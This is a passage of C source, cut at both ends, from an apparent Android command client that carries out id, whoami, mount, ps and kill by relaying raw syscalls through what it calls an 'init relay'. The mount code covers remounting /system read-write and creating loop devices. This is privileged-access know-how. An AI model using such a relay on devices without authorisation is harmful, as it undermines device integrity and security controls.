    else printf(" gid=%lld", (long long)gid);

    if (euid != uid) {
        const char *en = uid_name((uint32_t)euid);
        if (en) printf(" euid=%lld(%s)", (long long)euid, en);
        else printf(" euid=%lld", (long long)euid);
    }
    if (egid != gid) {
        const char *en = uid_name((uint32_t)egid);
        if (en) printf(" egid=%lld(%s)", (long long)egid, en);
        else printf(" egid=%lld", (long long)egid);
    }

    /* Supplementary groups via SYS_getgroups */
    /* getgroups(size, list): x0=size, x1=list_ptr. We pass size=0 first to get count,
     * then read groups from /proc/self/status Groups: line (more reliable via relay) */
    {
        uint8_t *status_data;
        ssize_t sz = relay_read_file(sock, "/proc/self/status", &status_data, 8192);
        if (sz > 0) {
            status_data[sz] = '\0';
            char *grp_line = strstr((char *)status_data, "Groups:");
            if (grp_line) {
                grp_line += 7;
                char *end_line = strchr(grp_line, '\n');
                if (end_line) *end_line = '\0';
                /* Parse whitespace-separated GID list */
                printf(" groups=");
                int first = 1;
                char *tok = grp_line;
                while (*tok) {
                    while (*tok == ' ' || *tok == '\t') tok++;
                    if (*tok == '\0') break;
                    char *num_start = tok;
                    while (*tok >= '0' && *tok <= '9') tok++;
                    if (tok > num_start) {
                        char save = *tok;
                        *tok = '\0';
                        uint32_t g = (uint32_t)strtoul(num_start, NULL, 10);
                        *tok = save;
                        if (!first) putchar(',');
                        const char *gn = uid_name(g);
                        if (gn) printf("%u(%s)", g, gn);
                        else printf("%u", g);
                        first = 0;
                    }
                }
            }
            free(status_data);
        }
    }

    /* SELinux context */
    int64_t ctx_fd = relay_openat(sock, "/proc/self/attr/current", MY_O_RDONLY, 0);
    if (ctx_fd >= 0) {
        uint8_t cbuf[256];
        memset(cbuf, 0, sizeof(cbuf));
        int64_t n = relay_read(sock, ctx_fd, cbuf, sizeof(cbuf) - 1);
        relay_close(sock, ctx_fd);
        if (n > 0) {
            cbuf[n] = '\0';
            if (cbuf[n-1] == '\n') cbuf[n-1] = '\0';
            printf(" context=%s", (char *)cbuf);
        }
    }
    printf("\n");
    return 0;
}

static int cmd_pwd(int sock, int argc, char *argv[]) {
    (void)sock; (void)argc; (void)argv;
    printf("%s\n", g_cwd);
    return 0;
}

static int cmd_whoami(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    int64_t uid = send_syscall(sock, SYS_getuid, 0,0,0,0,0,0, 0, NULL,0, NULL,0);
    if (uid == 0) printf("root\n");
    else if (uid == 1000) printf("system\n");
    else if (uid == 2000) printf("shell\n");
    else printf("uid%lld\n", (long long)uid);
    return 0;
}

static int cmd_mount(int sock, int argc, char *argv[]) {
    /* ── Mount flag constants from <linux/mount.h> — immutable kernel ABI ── */
    const unsigned long MS_RDONLY      = 0x1;
    const unsigned long MS_NOSUID      = 0x2;
    const unsigned long MS_NODEV       = 0x4;
    const unsigned long MS_NOEXEC      = 0x8;
    const unsigned long MS_SYNCHRONOUS = 0x10;
    const unsigned long MS_REMOUNT     = 0x20;
    const unsigned long MS_DIRSYNC     = 0x80;
    const unsigned long MS_NOATIME     = 0x400;
    const unsigned long MS_NODIRATIME  = 0x800;
    const unsigned long MS_BIND        = 0x1000;
    const unsigned long MS_MOVE        = 0x2000;
    const unsigned long MS_REC         = 0x4000;
    const unsigned long MS_SILENT      = 0x8000;
    const unsigned long MS_UNBINDABLE  = 0x20000;
    const unsigned long MS_PRIVATE     = 0x40000;
    const unsigned long MS_SLAVE       = 0x80000;
    const unsigned long MS_SHARED      = 0x100000;
    const unsigned long MS_RELATIME    = 0x200000;
    const unsigned long MS_LAZYTIME    = 0x2000000;

    /* ── Toybox-compatible -o flag map ──
     * Each entry: name, MS_* value to set, MS_* value to clear.
     * Positive flags:  set != 0, clear == 0  → mflags |= set
     * Negative flags:  set == 0, clear != 0  → mflags &= ~clear
     * No-op flags:     set == 0, clear == 0  → accepted, ignored */
    struct mflag {
        const char *name;
        unsigned long set;
        unsigned long clear;
    };
    const struct mflag flag_map[] = {
        /* positive flags */
        {"ro",          MS_RDONLY,      0},
        {"nosuid",      MS_NOSUID,      0},
        {"nodev",       MS_NODEV,       0},
        {"noexec",      MS_NOEXEC,      0},
        {"remount",     MS_REMOUNT,     0},
        {"sync",        MS_SYNCHRONOUS, 0},
        {"dirsync",     MS_DIRSYNC,     0},
        {"noatime",     MS_NOATIME,     0},
        {"nodiratime",  MS_NODIRATIME,  0},
        {"relatime",    MS_RELATIME,    0},
        {"bind",        MS_BIND,        0},
        {"rbind",       MS_BIND | MS_REC, 0},
        {"move",        MS_MOVE,        0},
        {"shared",      MS_SHARED,      0},
        {"rshared",     MS_SHARED | MS_REC, 0},
        {"private",     MS_PRIVATE,     0},
        {"rprivate",    MS_PRIVATE | MS_REC, 0},
        {"slave",       MS_SLAVE,       0},
        {"rslave",      MS_SLAVE | MS_REC, 0},
        {"unbindable",  MS_UNBINDABLE,  0},
        {"runbindable", MS_UNBINDABLE | MS_REC, 0},
        {"lazytime",    MS_LAZYTIME,    0},
        {"rec",         MS_REC,         0},
        {"loud",        0,              MS_SILENT},
        /* negative flags (clear the corresponding bit) */
        {"rw",          0,              MS_RDONLY},
        {"suid",        0,              MS_NOSUID},
        {"dev",         0,              MS_NODEV},
        {"exec",        0,              MS_NOEXEC},
        {"async",       0,              MS_SYNCHRONOUS},
        {"atime",       0,              MS_NOATIME},
        {"diratime",    0,              MS_NODIRATIME},
        {"norelatime",  0,              MS_RELATIME},
        {"nolazytime",  0,              MS_LAZYTIME},
        /* no-op flags (accepted but ignored) */
        {"loop",        0,              0},
        {"defaults",    0,              0},
        {"quiet",       0,              0},
        {"user",        0,              0},
        {"nouser",      0,              0},
        {NULL,          0,              0}
    };

    /* ══════════════════════════════════════════════════════════════════════
     * No arguments → print /proc/mounts (read-only info display)
     * ══════════════════════════════════════════════════════════════════════ */
    if (argc < 2) {
        int64_t fd = relay_openat(sock, "/proc/self/mountinfo", MY_O_RDONLY, 0);
        if (fd < 0) {
            fd = relay_openat(sock, "/proc/mounts", MY_O_RDONLY, 0);
            if (fd < 0) {
                fprintf(stderr, "mount: cannot read mount info: %s\n",
                        errno_str((int)(-fd)));
                return 1;
            }
        }
        for (;;) {
            if (g_sigint) { g_sigint = 0; break; }
            uint8_t buf[DATA_SIZE];
            int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
            if (n <= 0) break;
            fwrite(buf, 1, (size_t)n, stdout);
            if ((size_t)n < DATA_SIZE) break;
        }
        relay_close(sock, fd);
        fflush(stdout);
        return 0;
    }

    /* ══════════════════════════════════════════════════════════════════════
     * Parse command-line flags and options
     * ══════════════════════════════════════════════════════════════════════ */
    const char *type_arg = NULL;     /* -t <type> */
    const char *opts_arg = NULL;     /* -o <options> */
    unsigned long mflags = 0;        /* accumulated MS_* flags */
    int verbose = 0;                 /* -v */
    int fake = 0;                    /* -f (dry run) */
    const char *positionals[2];
    int npos = 0;

    for (int i = 1; i < argc; i++) {
        /* Long options: --bind, --move, --shared, --private, --remount etc. */
        if (strncmp(argv[i], "--", 2) == 0) {
            const char *lopt = argv[i] + 2;
            int found = 0;
            for (int m = 0; flag_map[m].name; m++) {
                if (strcmp(lopt, flag_map[m].name) == 0) {
                    mflags |= flag_map[m].set;
                    mflags &= ~flag_map[m].clear;
                    found = 1;
                    break;
                }
            }
            if (!found) {
                fprintf(stderr, "mount: unknown option --%s\n", lopt);
                return 1;
            }
            continue;
        }

        /* Short options */
        if (argv[i][0] == '-' && argv[i][1] != '\0') {
            /* -t and -o consume the next argument */
            if (strcmp(argv[i], "-t") == 0) {
                if (i + 1 >= argc) {
                    fprintf(stderr, "mount: -t requires a type argument\n");
                    return 1;
                }
                type_arg = argv[++i];
                continue;
            }
            if (strcmp(argv[i], "-o") == 0) {
                if (i + 1 >= argc) {
                    fprintf(stderr, "mount: -o requires an options argument\n");
                    return 1;
                }
                opts_arg = argv[++i];
                continue;
            }
            /* Bundled single-char flags: -afFrsvw */
            for (const char *f = argv[i] + 1; *f; f++) {
                switch (*f) {
                case 'r': mflags |= MS_RDONLY; break;
                case 'w': mflags &= ~MS_RDONLY; break;
                case 'v': verbose = 1; break;
                case 'f': fake = 1; break;
                case 's': mflags |= MS_SILENT; break;
                case 'a':
                    fprintf(stderr, "mount: -a (mount all from /etc/fstab) not supported\n");
                    return 1;
                case 'F':
                    fprintf(stderr, "mount: -F (fork per mount) not supported\n");
                    return 1;
                default:
                    fprintf(stderr, "mount: unknown flag -%c\n", *f);
                    return 1;
                }
            }
            continue;
        }

        /* Positional argument: source or target */
        if (npos >= 2) {
            fprintf(stderr, "mount: too many arguments (max 2: [source] target)\n");
            return 1;
        }
        positionals[npos++] = argv[i];
    }

    /* ══════════════════════════════════════════════════════════════════════
     * Parse -o options: split into MS_* flags vs fs-specific data string
     * ══════════════════════════════════════════════════════════════════════ */
    char fs_opts[DATA_SIZE];  /* fs-specific options collected here */
    size_t fs_opts_len = 0;
    fs_opts[0] = '\0';

    if (opts_arg) {
        char opts_buf[DATA_SIZE];
        size_t olen = strlen(opts_arg);
        if (olen >= sizeof(opts_buf)) {
            fprintf(stderr, "mount: -o options string too long\n");
            return 1;
        }
        memcpy(opts_buf, opts_arg, olen + 1);

        char *saveptr = NULL;
        char *tok = strtok_r(opts_buf, ",", &saveptr);
        while (tok) {
            int found = 0;
            for (int m = 0; flag_map[m].name; m++) {
                if (strcmp(tok, flag_map[m].name) == 0) {
                    mflags |= flag_map[m].set;
                    mflags &= ~flag_map[m].clear;
                    found = 1;
                    break;
                }
            }
            if (!found) {
                /* fs-specific option — append to fs_opts string */
                if (fs_opts_len > 0) {
                    if (fs_opts_len + 1 >= sizeof(fs_opts)) {
                        fprintf(stderr, "mount: fs options overflow\n");
                        return 1;
                    }
                    fs_opts[fs_opts_len++] = ',';
                }
                size_t tlen = strlen(tok);
                if (fs_opts_len + tlen >= sizeof(fs_opts)) {
                    fprintf(stderr, "mount: fs options overflow\n");
                    return 1;
                }
                memcpy(fs_opts + fs_opts_len, tok, tlen);
                fs_opts_len += tlen;
                fs_opts[fs_opts_len] = '\0';
            }
            tok = strtok_r(NULL, ",", &saveptr);
        }
    }

    const char *data_str = fs_opts_len > 0 ? fs_opts : NULL;

    /* ══════════════════════════════════════════════════════════════════════
     * Route to the appropriate mount operation
     * ══════════════════════════════════════════════════════════════════════ */

    /* --- Propagation change (shared/private/slave/unbindable) ---
     * Single target, no source. Kernel: mount(NULL, target, NULL, flags, NULL) */
    if (mflags & (MS_SHARED | MS_PRIVATE | MS_SLAVE | MS_UNBINDABLE)) {
        if (!(mflags & (MS_BIND | MS_MOVE | MS_REMOUNT))) {
            if (npos != 1) {
                fprintf(stderr, "mount: propagation change requires exactly 1 argument (target)\n");
                return 1;
            }
            char abs[CWD_SIZE];
            resolve_path(positionals[0], abs);

            /* Add MS_REC if not already set — matches toybox behavior */
            if (!(mflags & MS_REC))
                mflags |= MS_REC;

            if (verbose || fake) {
                printf("mount(NULL, \"%s\", NULL, 0x%lx, NULL)\n", abs, mflags);
            }
            if (fake) return 0;

            int64_t ret = relay_mount_simple(sock, abs, mflags);
            if (ret < 0) {
                fprintf(stderr, "mount: propagation change on %s: %s\n",
                        abs, errno_str((int)(-ret)));
                return 1;
            }
            if (verbose) {
                const char *ptype = "propagation";
                if (mflags & MS_SHARED)      ptype = "shared";
                else if (mflags & MS_PRIVATE) ptype = "private";
                else if (mflags & MS_SLAVE)   ptype = "slave";
                else if (mflags & MS_UNBINDABLE) ptype = "unbindable";
                printf("mount: %s propagation set on %s\n", ptype, abs);
            }
            return 0;
        }
    }

    /* --- Remount ---
     * mount(NULL, target, NULL, MS_REMOUNT|flags, data_or_NULL) */
    if ((mflags & MS_REMOUNT) && !(mflags & (MS_BIND | MS_MOVE))) {
        if (npos != 1) {
            fprintf(stderr, "mount: remount requires exactly 1 argument (target)\n");
            return 1;
        }
        char abs[CWD_SIZE];
        resolve_path(positionals[0], abs);

        if (verbose || fake) {
            printf("mount(NULL, \"%s\", NULL, 0x%lx, %s%s%s)\n",
                   abs, mflags,
                   data_str ? "\"" : "", data_str ? data_str : "NULL",
                   data_str ? "\"" : "");
        }
        if (fake) return 0;

        int64_t ret;
        if (data_str) {
            ret = relay_mount(sock, NULL, abs, NULL, mflags, data_str);
        } else {
            ret = relay_mount_simple(sock, abs, mflags);
        }
        if (ret < 0) {
            fprintf(stderr, "mount: remount %s: %s\n", abs, errno_str((int)(-ret)));
            return 1;
        }
        if (verbose)
            printf("mount: remounted %s (flags=0x%lx)\n", abs, mflags);
        return 0;
    }

    /* --- Bind mount ---
     * mount(source, target, NULL, MS_BIND|extras, NULL) */
    if (mflags & MS_BIND) {
        if (npos != 2) {
            fprintf(stderr, "mount: bind mount requires 2 arguments (source target)\n");
            return 1;
        }
        char abs_src[CWD_SIZE], abs_tgt[CWD_SIZE];
        resolve_path(positionals[0], abs_src);
        resolve_path(positionals[1], abs_tgt);

        if (verbose || fake) {
            printf("mount(\"%s\", \"%s\", NULL, 0x%lx, NULL)\n",
                   abs_src, abs_tgt, mflags);
        }
        if (fake) return 0;

        int64_t ret = relay_mount(sock, abs_src, abs_tgt, NULL, mflags, NULL);
        if (ret < 0) {
            fprintf(stderr, "mount: bind %s -> %s: %s\n",
                    abs_src, abs_tgt, errno_str((int)(-ret)));
            return 1;
        }
        if (verbose)
            printf("mount: bind %s -> %s\n", abs_src, abs_tgt);
        return 0;
    }

    /* --- Move mount ---
     * mount(source, target, NULL, MS_MOVE, NULL) */
    if (mflags & MS_MOVE) {
        if (npos != 2) {
            fprintf(stderr, "mount: move mount requires 2 arguments (source target)\n");
            return 1;
        }
        char abs_src[CWD_SIZE], abs_tgt[CWD_SIZE];
        resolve_path(positionals[0], abs_src);
        resolve_path(positionals[1], abs_tgt);

        if (verbose || fake) {
            printf("mount(\"%s\", \"%s\", NULL, 0x%lx, NULL)\n",
                   abs_src, abs_tgt, mflags);
        }
        if (fake) return 0;

        int64_t ret = relay_mount(sock, abs_src, abs_tgt, NULL, mflags, NULL);
        if (ret < 0) {
            fprintf(stderr, "mount: move %s -> %s: %s\n",
                    abs_src, abs_tgt, errno_str((int)(-ret)));
            return 1;
        }
        if (verbose)
            printf("mount: move %s -> %s\n", abs_src, abs_tgt);
        return 0;
    }

    /* --- Normal mount with explicit type ---
     * mount(source, target, type, flags, data) */
    if (type_arg) {
        if (npos != 2) {
            fprintf(stderr, "mount: need 2 arguments: <source> <target>\n");
            return 1;
        }
        char abs_src[CWD_SIZE], abs_tgt[CWD_SIZE];
        resolve_path(positionals[0], abs_src);
        resolve_path(positionals[1], abs_tgt);

        if (verbose || fake) {
            printf("mount(\"%s\", \"%s\", \"%s\", 0x%lx, %s%s%s)\n",
                   abs_src, abs_tgt, type_arg, mflags,
                   data_str ? "\"" : "", data_str ? data_str : "NULL",
                   data_str ? "\"" : "");
        }
        if (fake) return 0;

        int64_t ret = relay_mount(sock, abs_src, abs_tgt, type_arg, mflags, data_str);
        if (ret < 0) {
            fprintf(stderr, "mount: mount(%s, %s, %s, 0x%lx): %s\n",
                    abs_src, abs_tgt, type_arg, mflags, errno_str((int)(-ret)));
            return 1;
        }
        if (verbose)
            printf("mount: mounted %s on %s (type=%s, flags=0x%lx)\n",
                   abs_src, abs_tgt, type_arg, mflags);
        return 0;
    }

    /* --- Autodetect: 2 args, no -t ---
     * If source is a regular file → loop mount
     * If source is a directory → bind mount
     * Otherwise → try plain mount (kernel autodetects type) */
    if (npos == 2) {
        char abs_src[CWD_SIZE], abs_tgt[CWD_SIZE];
        resolve_path(positionals[0], abs_src);
        resolve_path(positionals[1], abs_tgt);

        /* stat the source to determine type */
        uint8_t statbuf[128];
        int64_t sr = relay_fstatat(sock, abs_src, statbuf, sizeof(statbuf));
        if (sr >= 0) {
            uint32_t st_mode = unpack_u32(statbuf + 16);
            uint32_t ftype = st_mode & 0xF000;

            /* Regular file → loop mount autodetection */
            if (ftype == 0x8000) {
                /* 1. Open /dev/loop-control and get a free loop device */
                int64_t ctlfd = relay_openat(sock, "/dev/loop-control", MY_O_RDWR, 0);
                if (ctlfd < 0) {
                    fprintf(stderr, "mount: cannot open /dev/loop-control: %s\n",
                            errno_str((int)(-ctlfd)));
                    return 1;
                }
                int64_t loop_nr = send_syscall(sock, SYS_ioctl,
                                               (uint64_t)ctlfd, 0x4C82/*LOOP_CTL_GET_FREE*/,
                                               0, 0, 0, 0,
                                               0, NULL, 0, NULL, 0);
                relay_close(sock, ctlfd);
                if (loop_nr < 0) {
                    fprintf(stderr, "mount: LOOP_CTL_GET_FREE failed: %s\n",
                            errno_str((int)(-loop_nr)));
                    return 1;
                }

                /* 2. Open the loop device (create via mknod if needed) */
                char loop_path[64];
                snprintf(loop_path, sizeof(loop_path), "/dev/block/loop%lld",
                         (long long)loop_nr);
                int64_t loopfd = relay_openat(sock, loop_path, MY_O_RDWR, 0);
                if (loopfd < 0) {
                    /* Create the device node: major=7, minor=loop_nr */
                    uint32_t dev = ((7 & 0xfff) << 8)
                                 | ((uint32_t)loop_nr & 0xff)
                                 | (((uint32_t)loop_nr & 0xfff00) << 12);
                    relay_mknodat(sock, loop_path, 0060000 | 0660, dev);
                    loopfd = relay_openat(sock, loop_path, MY_O_RDWR, 0);
                }
                if (loopfd < 0) {
                    fprintf(stderr, "mount: cannot open loop device %s: %s\n",
                            loop_path, errno_str((int)(-loopfd)));
                    return 1;
                }

                /* 3. Open the image file and bind to loop device */
                int64_t imgfd = relay_openat(sock, abs_src, MY_O_RDWR, 0);
                if (imgfd < 0) {
                    /* Fall back to read-only */
                    imgfd = relay_openat(sock, abs_src, MY_O_RDONLY, 0);
                    mflags |= MS_RDONLY;
                }
                if (imgfd < 0) {
                    fprintf(stderr, "mount: cannot open %s: %s\n",
                            abs_src, errno_str((int)(-imgfd)));
                    relay_close(sock, loopfd);
                    return 1;
                }
                int64_t lr = send_syscall(sock, SYS_ioctl,
                                          (uint64_t)loopfd, 0x4C00/*LOOP_SET_FD*/,
                                          (uint64_t)imgfd, 0, 0, 0,
                                          0, NULL, 0, NULL, 0);
                relay_close(sock, imgfd);
                relay_close(sock, loopfd);
                if (lr < 0) {
                    fprintf(stderr, "mount: LOOP_SET_FD failed: %s\n",
                            errno_str((int)(-lr)));
                    return 1;
                }

                if (verbose || fake) {
                    printf("mount: loop device %s bound to %s\n", loop_path, abs_src);
                    printf("mount(\"%s\", \"%s\", %s%s%s, 0x%lx, %s%s%s)\n",
                           loop_path, abs_tgt,
                           type_arg ? "\"" : "", type_arg ? type_arg : "NULL",
                           type_arg ? "\"" : "",
                           mflags,
                           data_str ? "\"" : "", data_str ? data_str : "NULL",
                           data_str ? "\"" : "");
                }
                if (fake) return 0;

                /* 4. Mount the loop device (kernel autodetects fs type) */
                int64_t ret = relay_mount(sock, loop_path, abs_tgt, NULL,
                                          mflags, data_str);
                if (ret < 0) {
                    fprintf(stderr, "mount: mount(%s, %s): %s\n",
                            loop_path, abs_tgt, errno_str((int)(-ret)));
                    /* Clean up: detach the loop device */
                    loopfd = relay_openat(sock, loop_path, MY_O_RDWR, 0);
                    if (loopfd >= 0) {
                        send_syscall(sock, SYS_ioctl,
                                     (uint64_t)loopfd, 0x4C01/*LOOP_CLR_FD*/,
                                     0, 0, 0, 0,
                                     0, NULL, 0, NULL, 0);
                        relay_close(sock, loopfd);
                    }
                    return 1;
                }
                if (verbose)
                    printf("mount: mounted %s on %s (via %s)\n",
                           abs_src, abs_tgt, loop_path);
                return 0;
            }

            /* Directory → bind mount */
            if (ftype == 0x4000) {
                mflags |= MS_BIND;
                if (verbose || fake) {
                    printf("mount(\"%s\", \"%s\", NULL, 0x%lx, NULL)\n",
                           abs_src, abs_tgt, mflags);
                }
                if (fake) return 0;

                int64_t ret = relay_mount(sock, abs_src, abs_tgt, NULL, mflags, NULL);
                if (ret < 0) {
                    fprintf(stderr, "mount: bind %s -> %s: %s\n",
                            abs_src, abs_tgt, errno_str((int)(-ret)));
                    return 1;
                }
                if (verbose)
                    printf("mount: bind %s -> %s\n", abs_src, abs_tgt);
                return 0;
            }
        }

        /* Source is a block device or stat failed — try plain mount */
        if (verbose || fake) {
            printf("mount(\"%s\", \"%s\", NULL, 0x%lx, %s%s%s)\n",
                   abs_src, abs_tgt, mflags,
                   data_str ? "\"" : "", data_str ? data_str : "NULL",
                   data_str ? "\"" : "");
        }
        if (fake) return 0;

        int64_t ret = relay_mount(sock, abs_src, abs_tgt, NULL, mflags, data_str);
        if (ret < 0) {
            fprintf(stderr, "mount: mount(%s, %s, 0x%lx): %s\n",
                    abs_src, abs_tgt, mflags, errno_str((int)(-ret)));
            return 1;
        }
        if (verbose)
            printf("mount: mounted %s on %s\n", abs_src, abs_tgt);
        return 0;
    }

    /* --- Single target with remount flag from -o ---
     * e.g. mount -o remount,ro /system */
    if (npos == 1 && (mflags & MS_REMOUNT)) {
        char abs[CWD_SIZE];
        resolve_path(positionals[0], abs);

        if (verbose || fake) {
            printf("mount(NULL, \"%s\", NULL, 0x%lx, %s%s%s)\n",
                   abs, mflags,
                   data_str ? "\"" : "", data_str ? data_str : "NULL",
                   data_str ? "\"" : "");
        }
        if (fake) return 0;

        int64_t ret;
        if (data_str) {
            ret = relay_mount(sock, NULL, abs, NULL, mflags, data_str);
        } else {
            ret = relay_mount_simple(sock, abs, mflags);
        }
        if (ret < 0) {
            fprintf(stderr, "mount: remount %s: %s\n", abs, errno_str((int)(-ret)));
            return 1;
        }
        if (verbose)
            printf("mount: remounted %s (flags=0x%lx)\n", abs, mflags);
        return 0;
    }

    /* --- Unrecognized usage --- */
    fprintf(stderr,
        "mount: mount filesystem via init relay\n"
        "Usage: mount [-afFrsvw] [-t TYPE] [-o OPTION,] [[DEVICE] DIR]\n"
        "\n"
        "No arguments:  print /proc/mounts\n"
        "With arguments: mount filesystem\n"
        "\n"
        "Flags:\n"
        "  -t TYPE   filesystem type (ext4, overlay, tmpfs, ...)\n"
        "  -o OPTS   comma-separated options (ro,nosuid,nodev,...)\n"
        "  -r        read-only (same as -o ro)\n"
        "  -w        read-write (same as -o rw, default)\n"
        "  -v        verbose (print mount call)\n"
        "  -f        fake (dry run, don't actually mount)\n"
        "  -s        silent\n"
        "\n"
        "Long options:\n"
        "  --bind, --rbind, --move, --shared, --rshared,\n"
        "  --private, --rprivate, --slave, --rslave,\n"
        "  --unbindable, --runbindable, --remount\n"
        "\n"
        "Options (-o) parsed as MS_* flags:\n"
        "  ro, nosuid, nodev, noexec, sync, dirsync, noatime,\n"
        "  nodiratime, relatime, lazytime, bind, rbind, move,\n"
        "  shared, rshared, private, rprivate, slave, rslave,\n"
        "  unbindable, runbindable, remount, rec, loud\n"
        "  rw, suid, dev, exec, async, atime, diratime,\n"
        "  norelatime, nolazytime (clear corresponding flag)\n"
        "  loop, defaults, quiet, user, nouser (no-op)\n"
        "  All other options passed as fs-specific data.\n"
        "\n"
        "Examples:\n"
        "  mount                                  Show mounts\n"
        "  mount -t tmpfs tmpfs /mnt              Mount tmpfs\n"
        "  mount -o bind /src /dst                Bind mount\n"
        "  mount --bind /src /dst                 Bind mount\n"
        "  mount -o remount,rw /system            Remount RW\n"
        "  mount -o shared /system                Set shared\n"
        "  mount image.img /mnt                   Loop mount\n"
        "  mount -t overlay overlay /mnt -o lowerdir=/a,upperdir=/b,workdir=/c\n"
        "  mount -f -v -t ext4 /dev/block/sda1 /mnt   Dry run\n");
    return 1;
}

static int cmd_ps(int sock, int argc, char *argv[]) {
    int show_all = 0;
    int show_threads = 0;
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'e' || *f == 'A') show_all = 1;
                if (*f == 'T') show_threads = 1;
            }
        }
    }
    (void)show_all; (void)show_threads;

    int64_t fd = relay_openat(sock, "/proc", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) {
        fprintf(stderr, "ps: cannot open /proc: %s\n", errno_str((int)(-fd)));
        return 1;
    }

    printf("%-7s %-7s %-6s %1s %-8s %-8s %s\n",
           "PID", "PPID", "UID", "S", "VSZ", "RSS", "CMDLINE");

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;

        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            if (g_sigint) { g_sigint = 0; nbytes = 0; break; }

            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);

            if (d_reclen == 0) { nbytes = 0; break; }

            int is_pid = 1;
            for (const char *p = d_name; *p; p++) {
                if (*p < '0' || *p > '9') { is_pid = 0; break; }
            }

            if (is_pid && d_name[0] != '\0') {
                /* Read /proc/PID/stat for PPID, state, vsize, rss, name */
                char stat_path[128];
                snprintf(stat_path, sizeof(stat_path), "/proc/%s/stat", d_name);
                int64_t stfd = relay_openat(sock, stat_path, MY_O_RDONLY, 0);

                char ppid_str[16] = "?";
                char state_ch = '?';
                unsigned long vsize_kb = 0;
                long rss_pages = 0;
                char comm_name[64] = "";

                if (stfd >= 0) {
                    uint8_t stbuf[512];
                    memset(stbuf, 0, sizeof(stbuf));
                    int64_t stn = relay_read(sock, stfd, stbuf, sizeof(stbuf) - 1);
                    relay_close(sock, stfd);
                    if (stn > 0) {
                        stbuf[stn] = '\0';
                        /* Format: pid (comm) state ppid pgrp session tty_nr ... vsize rss ...
                         * Fields: 1=pid 2=(comm) 3=state 4=ppid ... 23=vsize 24=rss */
                        char *p = (char *)stbuf;
                        /* Skip pid */
                        while (*p && *p != '(') p++;
                        if (*p == '(') {
                            p++;
                            char *ce = strrchr(p, ')'); /* find LAST ) for comm with parens */
                            if (ce) {
                                size_t clen = (size_t)(ce - p);
                                if (clen >= sizeof(comm_name)) clen = sizeof(comm_name) - 1;
                                memcpy(comm_name, p, clen);
                                comm_name[clen] = '\0';
                                p = ce + 1;
                            }
                        }
                        /* Now parse space-separated fields after ) */
                        /* field3=state field4=ppid ... field23=vsize field24=rss */
                        int fnum = 3;
                        while (*p) {
                            while (*p == ' ') p++;
                            if (*p == '\0') break;
                            char *fstart = p;
                            while (*p && *p != ' ') p++;

                            if (fnum == 3) {
                                state_ch = *fstart;
                            } else if (fnum == 4) {
                                char save = *p; *p = '\0';
                                strncpy(ppid_str, fstart, sizeof(ppid_str) - 1);
                                *p = save;
                            } else if (fnum == 23) {
                                char save = *p; *p = '\0';
                                vsize_kb = strtoul(fstart, NULL, 10) / 1024;
                                *p = save;
                            } else if (fnum == 24) {
                                char save = *p; *p = '\0';
                                rss_pages = strtol(fstart, NULL, 10);
                                *p = save;
                                break; /* got all we need */
                            }
                            fnum++;
                        }
                    }
                }

                /* Read cmdline */
                char cmdline_path[128];
                snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", d_name);
                int64_t cfd = relay_openat(sock, cmdline_path, MY_O_RDONLY, 0);
                char cmdline[256];
                cmdline[0] = '\0';
                if (cfd >= 0) {
                    uint8_t cbuf[256];
                    memset(cbuf, 0, sizeof(cbuf));
                    int64_t cn = relay_read(sock, cfd, cbuf, sizeof(cbuf) - 1);
                    relay_close(sock, cfd);
                    if (cn > 0) {
                        for (int j = 0; j < cn - 1; j++) {
                            if (cbuf[j] == '\0') cbuf[j] = ' ';
                        }
                        cbuf[cn] = '\0';
                        strncpy(cmdline, (char *)cbuf, sizeof(cmdline) - 1);
                    }
                }
                /* If cmdline empty, use [comm_name] */
                if (cmdline[0] == '\0' && comm_name[0] != '\0') {
                    snprintf(cmdline, sizeof(cmdline), "[%s]", comm_name);
                }

                /* Read UID from status */
                char status_path[128];
                snprintf(status_path, sizeof(status_path), "/proc/%s/status", d_name);
                int64_t sfd = relay_openat(sock, status_path, MY_O_RDONLY, 0);
                char uid_display[32] = "?";
                if (sfd >= 0) {
                    uint8_t sbuf[1024];
                    memset(sbuf, 0, sizeof(sbuf));
                    int64_t sn = relay_read(sock, sfd, sbuf, sizeof(sbuf) - 1);
                    relay_close(sock, sfd);
                    if (sn > 0) {
                        sbuf[sn] = '\0';
                        char *uid_line = strstr((char *)sbuf, "Uid:");
                        if (uid_line) {
                            uid_line += 4;
                            while (*uid_line == '\t' || *uid_line == ' ') uid_line++;
                            char *end = uid_line;
                            while (*end >= '0' && *end <= '9') end++;
                            *end = '\0';
                            uint32_t u = (uint32_t)strtoul(uid_line, NULL, 10);
                            const char *un = uid_name(u);
                            if (un) snprintf(uid_display, sizeof(uid_display), "%s", un);
                            else snprintf(uid_display, sizeof(uid_display), "%u", u);
                        }
                    }
                }

                unsigned long rss_kb = (unsigned long)(rss_pages * 4); /* 4K pages */
                char state_str[2] = {state_ch, '\0'};
                printf("%-7s %-7s %-6s %s %-8lu %-8lu %s\n",
                       d_name, ppid_str, uid_display, state_str,
                       vsize_kb, rss_kb, cmdline);
            }
            pos += d_reclen;
        }
        if (nbytes <= 0) break;
    }
    relay_close(sock, fd);
    return 0;
}

static int cmd_kill(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "kill: missing operand\nUsage: kill [-<signal>] <pid>\n");
        return 1;
    }

    int sig = 15; /* SIGTERM */
    int pid_idx = 1;

    if (argv[1][0] == '-') {
        /* Try numeric first */
        char *endp;
        long val = strtol(argv[1] + 1, &endp, 10);
        if (*endp == '\0' && val > 0) {
            sig = (int)val;
        } else {
            /* Try signal name */
            sig = signal_by_name(argv[1] + 1);
            if (sig < 0) {
                fprintf(stderr, "kill: invalid signal: %s\n", argv[1]);
                return 1;
            }
        }
        pid_idx = 2;
    }

    if (pid_idx >= argc) { fprintf(stderr, "kill: missing pid\n"); return 1; }

    int pid = atoi(argv[pid_idx]);
    if (pid <= 0) {
